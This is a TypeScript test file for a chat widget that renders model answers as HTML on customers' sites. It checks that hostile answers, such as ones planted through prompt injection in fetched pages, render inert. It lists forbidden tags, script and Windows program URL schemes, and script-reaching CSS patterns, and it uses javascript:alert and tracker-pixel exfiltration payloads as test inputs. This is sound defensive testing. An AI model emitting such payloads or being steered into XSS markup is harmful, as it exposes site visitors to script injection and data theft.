/**
 * XSS tests for the surface that turns model output into HTML outside the
 * React app, where no JSX escaping protects it: the public chat widget
 * (`backend/app/static/widget.js`), a classic script served as-is and executed
 * inside customers' own pages - markup that runs there runs in the host
 * site's origin.
 *
 * Run with `yarn test:unit` (Node's built-in runner, no DOM). The widget has
 * no module system, so its rendering block is evaluated on its own from
 * between its `render-core` markers: the exact code the page runs.
 *
 * The widget re-renders the whole accumulated answer on every streamed chunk,
 * so every payload is also rendered at every prefix: a half-received answer
 * must be as inert as the final one.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";

type Render = (text: string) => string;

const WIDGET_SOURCE = readFileSync(
  new URL("../../backend/app/static/widget.js", import.meta.url),
  "utf8",
);

const WIDGET_CORE = (() => {
  const start = WIDGET_SOURCE.indexOf("// render-core:start");
  const end = WIDGET_SOURCE.indexOf("// render-core:end");
  assert.ok(start > 0 && end > start, "widget.js has lost its render-core markers");
  const context = vm.createContext({});
  vm.runInContext(`"use strict";\n${WIDGET_SOURCE.slice(start, end)}`, context);
  return context;
})();

// `root` is the platform URL the widget was loaded from (origin plus any
// BASE_PATH); without one, no image counts as the platform's. `strict` is
// PUBLIC_WIDGET_STRICT_RENDERING, which the widget reads from its config.
// `session` is the widget session's own route on the platform, under which
// its files and generated images download; without one, none is shown.
function loadWidgetRenderer(): (
  text: string,
  timeoutMs?: number,
  root?: string,
  strict?: boolean,
  session?: string,
  streaming?: boolean,
) => string {
  // Bounded: a renderer that never returns freezes the customer's page, and
  // must fail here instead of hanging the run.
  const call = new vm.Script("renderAssistant(input, root, strict, session, streaming)");
  return (text, timeoutMs = 2000, root, strict = false, session, streaming = false) => {
    WIDGET_CORE.input = text;
    WIDGET_CORE.root = root;
    WIDGET_CORE.strict = strict;
    WIDGET_CORE.session = session;
    WIDGET_CORE.streaming = streaming;
    return call.runInContext(WIDGET_CORE, { timeout: timeoutMs }) as string;
  };
}

const renderWidget = loadWidgetRenderer();
const renderStrict = (text: string, root?: string) => renderWidget(text, 2000, root, true);

type FrameScheduler = (
  request: (callback: () => void) => number,
  cancel: (id: number) => void,
  paint: () => void,
) => { schedule: () => void; cancel: () => void };
const frameScheduler = WIDGET_CORE.frameScheduler as FrameScheduler;

// Answers a model can be steered into writing (a prompt injection in a fetched
// page or a knowledge-base document is enough). Several target one renderer's
// syntax; every one is run through both.
//
// The list is a shared JSON fixture so this string-level test and the live
// `embedded-markdown-xss.spec.ts` (which runs the SAME payloads through a real
// Chromium `innerHTML`) can never drift - same convention as the chrome-pattern
// table both sides read.
const PAYLOADS: string[] = JSON.parse(
  readFileSync(
    new URL("../tests_e2e/fixtures/embedded-markdown-xss-payloads.json", import.meta.url),
    "utf8",
  ),
);

// Elements that run script, embed a document or change how the rest parses,
// and the SVG / MathML ones that animate, load something or parse as HTML -
// the same lists the live spec checks after the browser's own parse.
const FORBIDDEN_TAGS = new Set([
  "applet", "base", "embed", "form", "frame", "frameset", "iframe", "link",
  "meta", "noembed", "noframes", "noscript", "object", "plaintext",
  "script", "select", "style", "template", "textarea", "title", "xmp",
  "animate", "animatemotion", "animatetransform", "annotation-xml", "discard",
  "feimage", "foreignobject", "handler", "image", "maction", "mglyph", "set", "use",
]);
const URL_ATTRIBUTES = new Set([
  "action", "background", "cite", "data", "formaction", "href", "poster", "src", "xlink:href",
]);
const SCRIPT_SCHEMES = ["javascript", "vbscript", "data"];
// Windows protocol handlers that launch or drive a program and have a public
// exploitation history: refused in every mode, like the script schemes.
const PROGRAM_SCHEMES = [
  "hcp", "its", "mhtml", "mk", "ms-appinstaller", "ms-cxh", "ms-cxh-full", "ms-its", "ms-itss",
  "ms-msdt", "ms-officecmd", "search", "search-ms", "shell",
];
// Strict rendering's only schemes.
const WEB_SCHEMES = ["http", "https", "mailto", "tel"];
// What CSS could reach script with (IE's expression() and behaviors,
// Firefox's XBL bindings, a script URL), and what makes a drawing load
// something from outside itself, on cssReading()'s reading.
const SCRIPT_CSS = /expression\(|javascript:|vbscript:|(?:^|;)(?:-ms-)?behaviou?r:|(?:^|;)-moz-binding:/;
const DRAWING_REFS = /url\(|image-set\(|image\(|cross-fade\(|element\(|src\(/;
// What a drawing inherits from the HTML around it.
const DRAWING_INHERITED = /(?:^|;)(?:--|fill:|stroke:|marker(?:-start|-mid|-end)?:)/;
// Well-formed tags with double-quoted attributes: the only markup a safe
// render may contain (an SVG or MathML element may be self-closed). A `<`
// that is not the start of one is live markup.
const TAG = /<\/?([a-z][a-z0-9-]*)((?:\s+[a-z][a-z0-9:-]*="[^"<>]*")*)\s*\/?>/g;
const ATTRIBUTE = /\s+([a-z][a-z0-9:-]*)="([^"]*)"/g;

// Character references decoded, as the browser decodes an attribute value.
function decodeReferences(value: string): string {
  const named: Record<string, string> = {
    amp: "&", apos: "'", colon: ":", gt: ">", lt: "<", newline: "\n", quot: '"', tab: "\t",
  };
  return value.replace(/&(#x[0-9a-f]+|#[0-9]+|[a-z]+);?/gi, (ref, body: string) => {
    const key = body.toLowerCase();
    if (!key.startsWith("#")) return Object.hasOwn(named, key) ? named[key] : ref;
    const code = key.startsWith("#x") ? parseInt(key.slice(2), 16) : parseInt(key.slice(1), 10);
    return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "\ufffd";
  });
}

// The attribute value the browser hands the URL parser: character references
// decoded, then the tabs, newlines and controls it ignores removed.
function effectiveUrl(value: string): string {
  return decodeReferences(value).replace(/[\u0000-\u0020\u007f-\u009f]+/g, "").toLowerCase();
}

// A kept style or drawing attribute as the CSS parser reads it: character
// references and CSS escapes decoded, whitespace removed. A comment or a
// named reference this cannot decode must never have been kept.
function cssReading(value: string, context: string): string {
  const decoded = decodeReferences(value);
  assert.ok(!/&[a-z]/i.test(decoded) && !decoded.includes("/*"), `unreadable CSS ${JSON.stringify(value)} - ${context}`);
  return decoded
    .replace(/\\(?:([0-9a-f]{1,6})[ \t\n\r\f]?|([\s\S]))/gi, (_, hex: string | undefined, ch: string) => {
      if (!hex) return /[\n\r\f]/.test(ch) ? "" : ch;
      const code = parseInt(hex, 16);
      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "\ufffd";
    })
    .replace(/[\u0000-\u0020\u007f-\u009f]+/g, "")
    .toLowerCase();
}

// Nothing in `html` can run script, in any mode: no forbidden element, no
// event handler, no URL whose scheme runs script or launches a Windows
// program, no style that reaches script, and an SVG or MathML drawing holds
// no link and loads nothing from outside the page, whether written on it or
// inherited. `strict` also holds it to strict rendering: no style, no
// drawing, and only the web, mail and phone schemes.
function assertInert(html: string, payload: string, strict = false): void {
  const context = `payload ${JSON.stringify(payload)} rendered as ${JSON.stringify(html)}`;
  const drawing: string[] = [];
  for (const [tag, name, attributes] of html.matchAll(TAG)) {
    assert.ok(!FORBIDDEN_TAGS.has(name), `<${name}> survived - ${context}`);
    if (tag.startsWith("</")) {
      const at = drawing.lastIndexOf(name);
      if (at >= 0) drawing.length = at;
      continue;
    }
    const inDrawing = drawing.length > 0 || name === "svg" || name === "math";
    assert.ok(!(strict && inDrawing), `<${name}> drawn in strict rendering - ${context}`);
    assert.ok(!(drawing.length && name === "a"), `a link inside a drawing - ${context}`);
    if (inDrawing && !tag.endsWith("/>")) drawing.push(name);
    for (const [, attribute, value] of attributes.matchAll(ATTRIBUTE)) {
      assert.ok(!attribute.startsWith("on"), `${attribute}= survived - ${context}`);
      assert.ok(!(strict && attribute === "style"), `style= survived strict rendering - ${context}`);
      if (URL_ATTRIBUTES.has(attribute)) {
        assert.ok(!inDrawing, `${attribute}= inside a drawing - ${context}`);
        const scheme = /^([^:/?#]*):/.exec(effectiveUrl(value));
        assert.ok(
          !scheme ||
            (strict
              ? WEB_SCHEMES.includes(scheme[1])
              : !SCRIPT_SCHEMES.includes(scheme[1]) && !PROGRAM_SCHEMES.includes(scheme[1])),
          `${attribute}="${value}" is a ${scheme?.[1]}: URL - ${context}`,
        );
      }
      if (attribute === "style" || inDrawing) {
        const css = cssReading(value, context);
        assert.doesNotMatch(css, SCRIPT_CSS, `${attribute}="${value}" reaches script - ${context}`);
        // Nor does a drawing get such a reference from the HTML around it.
        if (inDrawing || DRAWING_INHERITED.test(css)) {
          assert.doesNotMatch(
            css.replace(/url\((['"]?)#[^'"()]*\1\)/g, ""),
            DRAWING_REFS,
            `${attribute}="${value}" loads something a drawing can use - ${context}`,
          );
        }
        assert.ok(!(inDrawing && css.includes("inherit")), `${attribute}="${value}" inherits into a drawing - ${context}`);
      }
    }
  }
  assert.ok(!html.replace(TAG, "").includes("<"), `live markup outside a clean tag - ${context}`);
}

function assertInertWhileStreaming(render: Render, payload: string, strict = false): void {
  for (let end = 1; end <= payload.length; end++) {
    assertInert(render(payload.slice(0, end)), payload.slice(0, end), strict);
  }
}

test("widget: a hostile answer renders inert, streamed and final", () => {
  for (const payload of PAYLOADS) assertInertWhileStreaming(renderWidget, payload);
});

test("widget: a hostile answer renders inert in strict rendering too", () => {
  const render = (text: string) => renderStrict(text, "https://xtm.example");
  for (const payload of PAYLOADS) assertInertWhileStreaming(render, payload, true);
});

test("widget: model text reaches innerHTML only through renderAssistant", () => {
  // The streamed bubble, its finalisation and the transcript re-render are the
  // three places an answer is written into the page; a new one must use the
  // same door or the streaming bypass this replaced comes back.
  // The streamed bubble is painted through paintAnswer, which keeps the
  // session images already on screen.
  const sinks = [
    ...WIDGET_SOURCE.matchAll(/(\w+)\.innerHTML\s*=\s*([^;]+);/g),
    ...WIDGET_SOURCE.matchAll(/paintAnswer\((\w+), ([^;]+)\);/g),
  ].filter(([, , value]) => /\b(accumulatedContent|m\.content)\b/.test(value));
  assert.ok(sinks.length >= 3, `expected the three answer sinks, found ${sinks.length}`);
  for (const [statement, , value] of sinks) {
    assert.match(value.trim(), /^renderAssistant\(/, `${statement} skips renderAssistant`);
  }
  // paintAnswer writes only the markup it is handed, parsed where nothing loads.
  assert.match(WIDGET_SOURCE, /var box = inertDocument\.createElement\("div"\);\s*box\.innerHTML = html;/);
  assert.match(WIDGET_SOURCE, /var inertDocument = document\.implementation\.createHTMLDocument\(""\);/);
  assert.equal([...WIDGET_SOURCE.matchAll(/\.innerHTML\s*=\s*html;/g)].length, 1);
});

// The link grammar ends a target at its first ")", so the ")" of "alert(1)"
// is left as text - as it always was.
test("widget: a link to a script URL keeps its text and loses its target", () => {
  assert.equal(
    renderWidget("[click](javascript:alert(1))"),
    '<p><a target="_blank" rel="noopener noreferrer">click</a>)</p>',
  );
});

test("widget: an unquoted attribute value keeps every character the browser would", () => {
  // Browsers keep "=" (and "/") inside an unquoted value; cutting there broke
  // the query string of a link an html-format agent wrote without quotes.
  assert.equal(renderWidget("<a href=/search?q=a=b&page=2>t</a>"), '<p><a href="/search?q=a=b&page=2">t</a></p>');
  assert.equal(
    renderStrict("<a href=/search?q=a=b&page=2>t</a>"),
    '<p><a href="/search?q=a=b&page=2" target="_blank" rel="noopener noreferrer">t</a></p>',
  );
});

test("widget: a bare heading marker, as a streamed heading passes through, still renders", () => {
  // It used to loop forever, freezing the page the widget is embedded in.
  assert.equal(renderWidget("# "), "<p># </p>");
  assert.equal(renderWidget("Intro\n## "), "<p>Intro</p><p>## </p>");
});

test("widget: an apostrophe after a stray tag does not hide the rest of the answer", () => {
  // The browser ends "<b, it's <strong>" at its first ">": a quote only opens
  // an attribute value right after "=". Read as a quote, the apostrophe hid
  // everything up to the next one. Same text the page showed before.
  assert.equal(
    renderWidget("if a<b, it's **sorted**. Here's why."),
    "<p>if asorted</strong>. Here's why.</p>",
  );
  assert.equal(renderWidget("When x<y, it's fine\nand we'll see."), "<p>When xand we'll see.</p>");
});

test("widget: an inherited property name is on no allow-list", () => {
  assert.equal(renderWidget("<constructor>kept</constructor>"), "<p>kept</p>");
});

const NEW_TAB = 'target="_blank" rel="noopener noreferrer"';
const PLATFORM = "https://xtm.example";

test("widget: by default an answer's images render as they always did", () => {
  const image = (html: string) => renderWidget(html, 2000, PLATFORM);
  assert.equal(
    image('<img src="https://cdn.example/diagram.png" alt="diagram" width="40">'),
    '<p><img src="https://cdn.example/diagram.png" alt="diagram" width="40"></p>',
  );
  // A root-relative path is left to the browser, which resolves it against the host page.
  assert.equal(image('<img src="/assets/x.png" alt="x">'), '<p><img src="/assets/x.png" alt="x"></p>');
  assert.equal(
    image('<img src="https://xtm.example/api/v1/files/1/download" alt="chart">'),
    '<p><img src="https://xtm.example/api/v1/files/1/download" alt="chart"></p>',
  );
  // A refused scheme still never loads.
  assert.equal(image('<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">'), '<p><img alt="inline"></p>');
  assert.equal(image('<img src="javascript:alert(1)" alt="x">'), '<p><img alt="x"></p>');
});

test("widget: in strict rendering an image the platform serves is shown, any other becomes a link", () => {
  const image = (html: string) => renderStrict(html, PLATFORM);
  assert.equal(
    image('<img src="https://xtm.example/api/v1/files/1/download" alt="chart">'),
    '<p><img src="https://xtm.example/api/v1/files/1/download" alt="chart"></p>',
  );
  // The platform writes its own paths root-relative; they load from the platform.
  assert.equal(
    image('<img src="/api/v1/files/1/download" alt="chart" width="40">'),
    '<p><img src="https://xtm.example/api/v1/files/1/download" alt="chart" width="40"></p>',
  );
  // A third-party image would hand its URL (and any data in it) to that host.
  assert.equal(
    image('<img src="https://tracker.example/p.gif?d=secret" alt="pixel">'),
    `<p><a href="https://tracker.example/p.gif?d=secret" ${NEW_TAB}>pixel</a></p>`,
  );
  assert.equal(
    image('<img src="https://tracker.example/p.gif">'),
    `<p><a href="https://tracker.example/p.gif" ${NEW_TAB}>https://tracker.example/p.gif</a></p>`,
  );
  // Look-alike hosts, a protocol-relative or backslash host, and a path the
  // host page would resolve are all someone else's.
  for (const src of [
    "https://xtm.example.evil.test/x.png",
    "https://xtm.example@evil.test/x.png",
    "//evil.test/x.png",
    "/\\evil.test/x.png",
    "x.png",
    "http://xtm.example/x.png",
  ]) {
    const html = image(`<img src="${src}" alt="x">`);
    assert.ok(!html.includes("<img"), `${src} was loaded: ${html}`);
    assert.match(html, /^<p><a href="[^"]+" target="_blank" rel="noopener noreferrer">x<\/a><\/p>$/);
  }
  // A data: image was never loaded (its scheme is refused) and still is not.
  assert.equal(image('<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">'), "<p>inline</p>");
  // Without a known platform, no image is the platform's.
  assert.equal(
    renderStrict('<img src="https://xtm.example/a.png" alt="a">'),
    `<p><a href="https://xtm.example/a.png" ${NEW_TAB}>a</a></p>`,
  );
});

test("widget: under a BASE_PATH only the platform's own paths are its images (strict)", () => {
  const root = "https://host.example/xtm-one/";
  const image = (src: string) => renderStrict(`<img src="${src}" alt="i">`, root);
  assert.equal(image("https://host.example/xtm-one/api/v1/files/1"), '<p><img src="https://host.example/xtm-one/api/v1/files/1" alt="i"></p>');
  assert.equal(image("/api/v1/files/1"), '<p><img src="https://host.example/xtm-one/api/v1/files/1" alt="i"></p>');
  assert.equal(image("https://host.example/other-app/x.png"), `<p><a href="https://host.example/other-app/x.png" ${NEW_TAB}>i</a></p>`);
  assert.equal(image("https://host.example/xtm-one-evil/x.png"), `<p><a href="https://host.example/xtm-one-evil/x.png" ${NEW_TAB}>i</a></p>`);
});

// An answer shows a stored file or a generated image with the platform's own
// address - "/api/v1/chat/files/<id>" (generate_image, the code interpreter,
// the screenshot tools) or "/api/v1/chat/images/<id>" (generate_image's
// database fallback) - both behind a platform sign-in a visitor never has.
// The widget asks its session's own routes for them instead.
const SESSION = `${PLATFORM}/api/v1/public/chat/tok/sessions/5f1c1c9e-6f7a-4c1e-9d55-2f0e0f5b7a10`;
const FILE_ID = "0b6f2c3e-8a41-4a7e-b3c2-9d1e5f7a2c48";
const IMAGE_ID = "7d2e9a14-3c5b-4f86-a0d1-6e8b2c4f9a37";
const OTHER_FILE_ID = "c3a0e6d2-1f4b-4c8a-9e7d-5b2f8a6c4e19";
const renderInSession = (text: string, strict = false, root = PLATFORM, session = SESSION) =>
  renderWidget(text, 2000, root, strict, session);
const sessionImg = (kind: "files" | "images", id: string, alt: string, session = SESSION) =>
  `<img src="${session}/${kind}/${id}" alt="${alt}" class="fc-img">`;

test("widget: an image stored for the session shows inline, loaded through the session, in both modes", () => {
  const written = [
    `/api/v1/chat/files/${FILE_ID}/download`,
    `/api/v1/chat/files/${FILE_ID}`,
    `${PLATFORM}/api/v1/chat/files/${FILE_ID}/download`,
    `/api/v1/chat/files/${FILE_ID.toUpperCase()}/download`,
  ];
  for (const strict of [false, true]) {
    for (const src of written) {
      assert.equal(renderInSession(`![chart](${src})`, strict), `<p>${sessionImg("files", FILE_ID, "chart")}</p>`);
      assert.equal(renderInSession(`<img src="${src}" alt="chart">`, strict), `<p>${sessionImg("files", FILE_ID, "chart")}</p>`);
    }
    assert.equal(
      renderInSession(`![a red fox](/api/v1/chat/images/${IMAGE_ID})`, strict),
      `<p>${sessionImg("images", IMAGE_ID, "a red fox")}</p>`,
    );
    assert.equal(
      renderInSession(`<img src="${PLATFORM}/api/v1/chat/images/${IMAGE_ID}" width="40">`, strict),
      `<p><img src="${SESSION}/images/${IMAGE_ID}" width="40" class="fc-img"></p>`,
    );
    assert.equal(
      renderInSession(`Here is the chart:\n\n![chart](/api/v1/chat/files/${FILE_ID}/download)\n\nThe **peak** is in May.`, strict),
      `<p>Here is the chart:</p><p>${sessionImg("files", FILE_ID, "chart")}</p><p>The <strong>peak</strong> is in May.</p>`,
    );
  }
});

test("widget: whatever file an answer names, only this session's own route is asked for it", () => {
  // Another session's file or a platform user's goes to THIS session's route,
  // which answers it like an unknown file.
  for (const strict of [false, true]) {
    assert.equal(
      renderInSession(`![x](/api/v1/chat/files/${OTHER_FILE_ID}/download)`, strict),
      `<p>${sessionImg("files", OTHER_FILE_ID, "x")}</p>`,
    );
  }
  // An answer naming another session's route is left exactly as written.
  const foreign = `${PLATFORM}/api/v1/public/chat/tok/sessions/9e8d7c6b-5a49-4382-a1b0-c9d8e7f6a5b4/files/${FILE_ID}`;
  for (const strict of [false, true]) {
    for (const text of [`<img src="${foreign}" alt="x">`, `![x](${foreign})`]) {
      assert.equal(renderInSession(text, strict), renderWidget(text, 2000, PLATFORM, strict));
    }
  }
});

test("widget: every other image an answer holds renders exactly as it did", () => {
  const sources = [
    "https://cdn.example/diagram.png",
    `https://evil.example/api/v1/chat/files/${FILE_ID}/download`,
    `https://xtm.example.evil.test/api/v1/chat/files/${FILE_ID}`,
    `//evil.test/api/v1/chat/files/${FILE_ID}`,
    `/\\evil.test/api/v1/chat/files/${FILE_ID}`,
    `http://xtm.example/api/v1/chat/files/${FILE_ID}`,
    `/api/v1/chat/files/${FILE_ID}/public?token=abc&expires=1`,
    `/api/v1/chat/files/${FILE_ID}/info`,
    `/api/v1/chat/files/${FILE_ID}/download?size=2`,
    `/api/v1/chat/files/not-a-uuid/download`,
    `/api/v1/chat/images/${IMAGE_ID}/download`,
    `api/v1/chat/files/${FILE_ID}`,
    "/api/v1/files/1/download",
    "data:image/png;base64,iVBORw0KGgo=",
    "javascript:alert(1)",
  ];
  for (const strict of [false, true]) {
    for (const src of sources) {
      for (const text of [`![pic](${src})`, `<img src="${src}" alt="pic">`]) {
        assert.equal(renderInSession(text, strict), renderWidget(text, 2000, PLATFORM, strict), `${text} (strict=${strict})`);
      }
    }
  }
});

test("widget: without a session an answer's platform addresses render as they always did", () => {
  assert.equal(
    renderWidget(`![chart](/api/v1/chat/files/${FILE_ID}/download)`, 2000, PLATFORM),
    `<p>!<a href="/api/v1/chat/files/${FILE_ID}/download" ${NEW_TAB}>chart</a></p>`,
  );
  assert.equal(
    renderWidget(`<img src="/api/v1/chat/files/${FILE_ID}/download" alt="c">`, 2000, PLATFORM),
    `<p><img src="/api/v1/chat/files/${FILE_ID}/download" alt="c"></p>`,
  );
  assert.equal(
    renderStrict(`<img src="/api/v1/chat/files/${FILE_ID}/download" alt="c">`, PLATFORM),
    `<p><img src="${PLATFORM}/api/v1/chat/files/${FILE_ID}/download" alt="c"></p>`,
  );
});

test("widget: under a BASE_PATH a session image loads through the prefixed session route", () => {
  const root = "https://host.example/xtm-one/";
  const session = "https://host.example/xtm-one/api/v1/public/chat/tok/sessions/5f1c1c9e-6f7a-4c1e-9d55-2f0e0f5b7a10";
  const bare = `https://host.example/api/v1/chat/files/${FILE_ID}/download`;
  for (const strict of [false, true]) {
    for (const src of [`/api/v1/chat/files/${FILE_ID}/download`, `https://host.example/xtm-one/api/v1/chat/files/${FILE_ID}`]) {
      assert.equal(renderInSession(`![c](${src})`, strict, root, session), `<p>${sessionImg("files", FILE_ID, "c", session)}</p>`);
    }
    // The platform's origin without its prefix is another application's path.
    for (const text of [`<img src="${bare}" alt="c">`, `![c](${bare})`]) {
      assert.equal(renderInSession(text, strict, root, session), renderWidget(text, 2000, root, strict));
    }
  }
});

test("widget: a streamed image appears once its address is complete and never loads a partial one", () => {
  const answer =
    `Here: ![chart](/api/v1/chat/files/${FILE_ID}/download) and ` +
    `<img src="/api/v1/chat/images/${IMAGE_ID}" alt="fox"> done.`;
  const complete = new Set([`${SESSION}/files/${FILE_ID}`, `${SESSION}/images/${IMAGE_ID}`]);
  for (const strict of [false, true]) {
    let shown = 0;
    for (let end = 1; end <= answer.length; end++) {
      const prefix = answer.slice(0, end);
      const html = renderInSession(prefix, strict);
      assertInert(html, prefix);
      // An empty source fetches nothing: a prefix ending on `<img src=` has its
      // tag closed by the renderer's own `</p>`, as it always had.
      // Only real tags count: an unfinished one stays escaped text.
      const attributes = [...html.matchAll(TAG)].map(([, , attrs]) => attrs).join(" ");
      const sources = [...attributes.matchAll(/ src="([^"]*)"/g)].map(([, value]) => value).filter(Boolean);
      for (const src of sources) assert.ok(complete.has(src), `prefix ${end} loads ${src}`);
      assert.doesNotMatch(attributes, /(?:href|src)="[^"]*\/api\/v1\/chat\//, `prefix ${end} targets a platform address`);
      shown = sources.length;
    }
    assert.equal(shown, 2);
  }
});

// A frame of a streamed answer: a tag whose own ">" has not arrived is
// text, and so is everything after its "<", whatever closes it in the
// renderer's own markup (the paragraph's "</p>", a line's "<br>", a
// "<strong>"). Code still being streamed shows the tags it holds as text.
const renderFrame = (text: string, strict = false) => renderWidget(text, 2000, PLATFORM, strict, SESSION, true);
// What a render has the browser fetch: an image, a `background`, a `url()` in
// an inline style (default rendering keeps both).
const loadedUrls = (html: string) =>
  [...html.matchAll(TAG)].flatMap(([, , attrs]) =>
    [...attrs.matchAll(ATTRIBUTE)]
      .filter(([, name, value]) => (name === "style" ? /url\(/i.test(value) : (name === "src" || name === "background") && value !== ""))
      .map(([, name, value]) => `${name}=${value}`),
  );

test("widget: a tag still being streamed stays text until its own end arrives", () => {
  for (const strict of [false, true]) {
    assert.equal(renderFrame("see <img src=/api/v1/chat/files/0b6f", strict), "<p>see &lt;img src=/api/v1/chat/files/0b6f</p>");
    // Plain text now, so its URL is linked like any other (a link loads nothing).
    assert.equal(
      renderFrame("see <img src=https://tracker.example/p", strict),
      `<p>see &lt;img src=<a href="https://tracker.example/p" ${NEW_TAB}>https://tracker.example/p</a></p>`,
    );
    assert.equal(renderFrame("see <img src=", strict), "<p>see &lt;img src=</p>");
    // A ">" inside a quoted value is not the tag's end.
    assert.equal(renderFrame('see <img alt="a>b" src=/x', strict), '<p>see &lt;img alt="a&gt;b" src=/x</p>');
    // Nor is markup in one of its values, which stays text with the rest.
    assert.equal(
      renderFrame('see <img alt="<b>" src=/api/v1/chat/files/0b6f', strict),
      '<p>see &lt;img alt="&lt;b&gt;" src=/api/v1/chat/files/0b6f</p>',
    );
    assert.equal(renderFrame('<img alt="<img src=/tracker>" src=/partial', strict), '<p>&lt;img alt="&lt;img src=/tracker&gt;" src=/partial</p>');
    assert.equal(renderFrame('<b title="<img src=/x>" data', strict), '<p>&lt;b title="&lt;img src=/x&gt;" data</p>');
    assert.equal(
      renderFrame('see <b>ok</b> <img title="a>" alt="<br>" src=/x', strict),
      '<p>see <b>ok</b> &lt;img title="a&gt;" alt="&lt;br&gt;" src=/x</p>',
    );
    for (const text of [
      "see <img alt='<i>x</i>' src=/x",
      'see <img alt="<img src=/tracker>" src=/partial',
      "see <a title='<img src=/tracker> <img src=/other>' href=/p",
      'see <img alt="x <!-- y" src=/partial',
    ]) {
      assert.deepEqual(loadedUrls(renderFrame(text, strict)), [], text);
    }
    // A session image in it stays the text and link any other image is.
    assert.doesNotMatch(renderFrame(`see <a href="![x](/api/v1/chat/files/${FILE_ID})`, strict), /<img/);
    // Closed by the renderer's own markup of the text after it: still text.
    assert.doesNotMatch(renderFrame("<img src=/x\nnext line", strict), /<img/);
    assert.doesNotMatch(renderFrame("<img src=/x **bold**", strict), /<img/);
    // Once its own ">" arrives, the frame renders it exactly as the final render does.
    const done = `see <img src="/api/v1/chat/files/${FILE_ID}" alt="c"> done`;
    assert.equal(renderFrame(done, strict), renderWidget(done, 2000, PLATFORM, strict, SESSION));
  }
});

// md() drops blank lines and ends every line with its own markup (a "</p>", a
// "<br>", a list), so how much text follows a tag says nothing about where the
// sanitizer ends it.
const LONG_TAILS = [
  "\n".repeat(20_000),
  "\r\n".repeat(10_000),
  " \t\f\n".repeat(5_000),
  "\n" + "x".repeat(20_000),
  "\n" + "x".repeat(9_000),
  "\n\n" + "- item\n".repeat(3_000),
  " **bold** " + "x".repeat(20_000),
];
const UNFINISHED_TAGS = [
  "<img src=/partial",
  '<img alt="a>b" src=/partial',
  "<img alt='a>b' src=/partial",
  '<img alt="<img src=/tracker>" src=/partial',
  "<a href=/partial",
  "<iframe src=/partial",
  "<video src=/partial",
  "<source src=/partial",
  '<p style="background:url(/partial)" title=x',
  "<table background=/partial",
];

test("widget: a tag still being streamed stays text however long the text after it", () => {
  const tail = "\n".repeat(20_000);
  for (const strict of [false, true]) {
    assert.equal(renderFrame(`<img src=/partial${tail}`, strict), "<p>&lt;img src=/partial</p>");
    assert.equal(renderFrame(`<img src=/partial\n${"x".repeat(20_000)}`, strict), `<p>&lt;img src=/partial<br>${"x".repeat(20_000)}</p>`);
    // A value still being written after the blank lines: a partial URL.
    assert.equal(renderFrame(`<img alt="x${tail}y" src=/partia`, strict), '<p>&lt;img alt="x</p><p>y" src=/partia</p>');
    for (const tag of UNFINISHED_TAGS) {
      const name = /^<(\w+)/.exec(tag)?.[1];
      for (const after of LONG_TAILS) {
        const label = `${tag} + ${JSON.stringify(after.slice(0, 10))} (strict=${strict})`;
        const html = renderFrame(tag + after, strict);
        assert.deepEqual(loadedUrls(html), [], label);
        // The text it is, never an element.
        assert.ok(html.startsWith(`<p>&lt;${name} `), `${label}: ${html.slice(0, 120)}`);
        assert.doesNotMatch(html, /<[a-z]+\s/, label);
        // Once its own ">" arrives, the frame renders it exactly as the final render does.
        const done = `${tag}>${after}`;
        assert.equal(renderFrame(done, strict), renderWidget(done, 2000, PLATFORM, strict, SESSION), label);
      }
    }
    // Before a code span still open, after one that closed, and inside one.
    assert.equal(renderFrame(`<img src=/partial${tail}\`x`, strict), "<p>&lt;img src=/partial</p><p>`x</p>");
    assert.equal(renderFrame(`\`code\` <img src=/partial${tail}`, strict), "<p><code>code</code> &lt;img src=/partial</p>");
    assert.equal(renderFrame(`use \`<img src=/partial${tail}`, strict), "<p>use `&lt;img src=/partial</p>");
    const code = `\`<img src=/partial${tail}\``;
    assert.equal(renderFrame(code, strict), renderWidget(code, 2000, PLATFORM, strict, SESSION));
    // The final render of a tag whose ">" never arrives is unchanged: md()'s
    // "</p>" ends it, as it always did.
    assert.equal(renderWidget(`<img src=/partial${tail}`, 2000, PLATFORM, strict, SESSION), `<p><img src="${strict ? PLATFORM : ""}/partial">`);
  }
});

test("widget: a tag the renderer's markup reads past its own end stays text while it streams", () => {
  // md() drops the text after a table row's last "|" (here the closing quote)
  // and a quote marker at the start of a line (here the tag's ">"): the
  // sanitizer then reads a tag whose own ">" has arrived on into the text
  // still arriving, up to the markup md() closes the frame with - a fence's
  // closers too while its code is still being written.
  const table = "<table><thead><tr><th>&lt;img alt='x</th></tr></thead><tbody></tbody></table>";
  const frames: Array<[string, string, string]> = [
    ["| <img alt='x | y'>\n|---|\nmore text ' src=/partia", `${table}<p>more text ' src=/partia</p>`, "l/full.png> end"],
    ["| <img alt='x | y'\n|---|\n> z ' src=/partia", `${table}<blockquote>z ' src=/partia</blockquote>`, "l/full.png> end"],
    ["| <img alt='x | y'>\n|---|\n```\n' src=/partia", `${table}<pre><code>' src=/partia</code></pre>`, "l/full.png\n```\n"],
  ];
  for (const strict of [false, true]) {
    for (const [frame, expected, rest] of frames) {
      assert.equal(renderFrame(frame, strict), expected);
      // Once the ">" the sanitizer ends it at arrives, the frame renders as the final render does.
      const done = frame + rest;
      assert.equal(renderFrame(done, strict), renderWidget(done, 2000, PLATFORM, strict, SESSION));
      assert.deepEqual(loadedUrls(renderFrame(done, strict)), [`src=${strict ? PLATFORM : ""}/partial/full.png`]);
    }
  }
});

test("widget: code still being streamed shows the tags it holds as text", () => {
  const fence = '```html\n<img src="https://cdn.example/a.png">\n';
  for (const strict of [false, true]) {
    // A fence not closed yet is already the code block it will be.
    assert.equal(renderFrame(fence, strict), '<pre><code>&lt;img src="https://cdn.example/a.png"&gt;</code></pre>');
    assert.equal(renderFrame(fence, strict), renderWidget(`${fence}\`\`\``, 2000, PLATFORM, strict, SESSION));
    // After a code span's opening backtick nothing is markup until it closes.
    assert.equal(renderFrame("use `<img src=/x>", strict), "<p>use `&lt;img src=/x&gt;</p>");
    assert.doesNotMatch(renderFrame(`write \`![c](/api/v1/chat/files/${FILE_ID})`, strict), /<img/);
    // Nor is a tag that span cuts: its ">" may yet turn out to be code.
    assert.doesNotMatch(renderFrame("<img alt=`a src=/x> and", strict), /<img/);
